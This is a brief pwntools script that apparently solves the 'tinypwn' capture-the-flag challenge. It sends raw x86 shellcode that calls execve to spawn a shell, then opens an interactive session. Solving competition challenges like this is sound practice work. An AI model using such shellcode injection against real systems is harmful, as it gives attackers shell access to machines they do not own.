from pwn import *

#io = remote('vsc.tf', 3026)
io = process('./tinypwn')
payload = b"\xBB\x20\x00\x01\x00\x31\xC9\x31\xD2\xB0\x0B\xCD\x80"

with open('payload', 'wb') as f:
    f.write(payload)
io.send(payload)
io.interactive()
